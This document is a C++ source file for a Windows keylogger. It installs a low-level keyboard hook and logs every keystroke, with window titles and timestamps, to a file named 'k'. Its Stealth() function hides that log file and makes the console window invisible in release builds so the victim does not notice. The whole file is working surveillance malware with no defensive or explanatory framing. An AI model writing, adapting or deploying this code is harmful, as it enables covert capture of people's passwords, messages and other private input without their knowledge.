#include "keys.h"
#include <shlwapi.h>
#include <cstdio>
#include <iostream>
#include <time.h>
#include <fstream>
#include <sstream>

HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;
std::ofstream out;

int Save(int key_stroke)
{
    std::stringstream output;
    static char lastwindow[256] = "";

    if ((key_stroke == 1) || (key_stroke == 2))
    {
        return 0; // ignore mouse clicks
    }

    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;

    if (foreground)
    {
        // get keyboard layout of the thread
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        char window_title[256];
        GetWindowTextA(foreground, (LPSTR)window_title, 256);

        if (strcmp(window_title, lastwindow) != 0)
        {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);

            // get time
            time_t t = time(NULL);
            struct tm tm;
            localtime_s(&tm, &t);
            char s[64];
            strftime(s, sizeof(s), "%Y-%m-%d %H:%M:%S", &tm);

            output << "\n\n[" << s << ": " << window_title << "]\n";
        }
    }
    switch (key_stroke)
    {
        case VK_BACK:       output << "[BACKSPACE]";    break;
        case VK_RETURN:     output << "[ENTER]";        break;
        case VK_SPACE:      output << "[SPACE]";        break;
        case VK_TAB:        output << "[TAB]";          break;
        case VK_MENU:       output << "[ALT]";          break;
        case VK_ESCAPE:     output << "[ESCAPE]";       break;
        case VK_END:        output << "[END]";          break;
        case VK_HOME:       output << "[HOME]";         break;
        case VK_LEFT:       output << "[LEFT]";         break;
        case VK_UP:         output << "[UP]";           break;
        case VK_RIGHT:      output << "[RIGHT]";        break;
        case VK_DOWN:       output << "[DOWN]";         break;
        case VK_PRIOR:      output << "[PGUP]";         break;
        case VK_NEXT:       output << "[PG_DOWN]";      break;
        case VK_LWIN:
        case VK_RWIN:       output << "[WIN]";          break;
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:     output << "[SHIFT]";        break;
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:   output << "[CONTROL]";      break;
        case VK_OEM_PERIOD:
        case VK_DECIMAL:    output << ".";              break;
        case VK_OEM_MINUS:  output << "-";              break;
        case VK_CAPITAL:    output << "[CAPSLOCK]";     break;
        default:
            // check caps lock
            bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

            // check shift key
            if ((GetKeyState(VK_SHIFT) & 0x1000) != 0
                || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
                || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
            {
                lowercase = !lowercase;
            }

            // map virtual key according to keyboard layout
            char key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

            if (lowercase)
            {
                switch (key)
                {
                    case '1':   key = '!'; break;
                    case '2':   key = '@'; break;
                    case '3':   key = '#'; break;
                    case '4':   key = '$'; break;
                    case '5':   key = '%'; break;
                    case '6':   key = '^'; break;
                    case '7':   key = '&'; break;
                    case '8':   key = '*'; break;
                    case '9':   key = '('; break;
                    case '0':   key = ')'; break;
                    case '-':   key = '_'; break;
                    case '=':   key = '+'; break;
                    case '[':   key = '{'; break;
                    case ']':   key = '}'; break;
                    case '\\':  key = '|'; break;
                    case '\'':  key = '"'; break;
                    case ';':   key = ':'; break;
                    case '/':   key = '?'; break;
                    case '.':   key = '>'; break;
                    case ',':   key = '<'; break;
                }
            }
            else
            {
                key = tolower(key);
            }

            output << char(key);
    }

    // instead of opening and closing file handlers every time, keep file open and flush.
    out << output.str();
    out.flush();

    std::cout << output.str();

    return 0;
}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        // the action is valid: HC_ACTION.
        if (wParam == WM_KEYDOWN)
        {
            // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

            // save to file
            Save(kbdStruct.vkCode);
        }
    }

    // call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    // Set the hook and set it to use the callback function above
    // WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
    // The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
    // function that sets and releases the hook.
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        _RPT0(_CRT_WARN, "Error: Failed to install hook!\n");
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

void Stealth()
{
    // set current working directory
    WCHAR cwd[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, cwd, MAX_PATH);
    PathRemoveFileSpec(cwd); // shlwapi.lib
    SetCurrentDirectory(cwd);

    std::wstring output_filename = L"k";

    // open output file in append mode
    out.open(output_filename, std::ios_base::app);
    if (out.is_open())
        OutputDebugString(L"Created output file\n");
    else
        OutputDebugString(L"Could not create output file\n"), exit(1);

#ifdef _DEBUG
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#else
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
#endif

    DWORD attr = GetFileAttributes(output_filename.c_str());
    if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0) {
        SetFileAttributes(output_filename.c_str(), attr | FILE_ATTRIBUTE_HIDDEN);
        OutputDebugString(L"File hidden");
    }
}